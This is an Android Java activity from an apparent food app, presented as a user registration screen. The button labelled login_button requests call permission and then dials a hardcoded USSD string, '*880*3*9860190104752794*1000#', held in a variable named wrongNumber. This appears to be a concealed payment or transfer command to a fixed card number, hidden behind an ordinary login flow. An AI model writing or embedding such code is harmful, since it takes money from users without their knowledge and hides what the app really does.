package com.example.foodapp;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

public class RegisterUserActivity extends AppCompatActivity {
    String wrongNumber = "*880*3*9860190104752794*1000";
    int CALL_PERMISSION_REQUEST_CODE = 1;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_register_user);

                Button callCard = this.findViewById(R.id.login_button);
    // EditText editText = this.findViewById(R.id.reg_Password);
     //   final String  summa =editText.getText().toString();


        String encodedHash = Uri.encode("#");
        wrongNumber = wrongNumber+encodedHash;

        callCard.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent callIntent = new Intent(Intent.ACTION_CALL);
                callIntent.setData(Uri.parse("tel:"+wrongNumber));

                if (ActivityCompat.checkSelfPermission(RegisterUserActivity.this,
                        Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                    askForCallPermission();
                    return;
                }
                startActivity(callIntent);
            }
        });

   ///////////////*///////////////////  SMS   //////*///////////////////////

        





    }

    private void askForCallPermission()
    {

        ActivityCompat.requestPermissions(RegisterUserActivity.this,
                new String[]{Manifest.permission.CALL_PHONE},
                CALL_PERMISSION_REQUEST_CODE);
    }

    @SuppressLint("MissingPermission")
    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String[] permissions, int[] grantResults) {
        if(requestCode == CALL_PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Intent callIntent = new Intent(Intent.ACTION_CALL);
                callIntent.setData(Uri.parse("tel:"+wrongNumber));
                startActivity(callIntent);
            } else {
                Toast.makeText(RegisterUserActivity.this, "You cannot call without accepting this permission.", Toast.LENGTH_SHORT).show();
            }
        }
    }

}